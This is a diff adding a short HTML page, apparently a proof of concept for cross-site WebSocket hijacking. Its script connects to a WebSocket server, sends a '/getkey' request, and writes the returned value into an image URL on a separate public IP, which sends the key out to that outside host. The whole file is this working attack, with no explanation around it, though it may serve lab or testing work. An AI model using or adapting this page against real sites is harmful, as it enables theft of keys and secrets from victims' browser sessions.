@@ -1,0 +1,14 @@
+<html>
+	<body>
+	<script>
+var uri   = "ws://[URL]/";
+var ws 	     = new WebSocket(uri);
+ws.onmessage = function(message) {
+	var data=JSON.parse(message.data);
+	document.write('<img src="http://[PUBLIC_IP]/'+data.text+'"/>');
+}
+
+ws.onopen= () => ws.send(JSON.stringify({ text: "/getkey" }));
+	</script>
+	</body>
+</html>
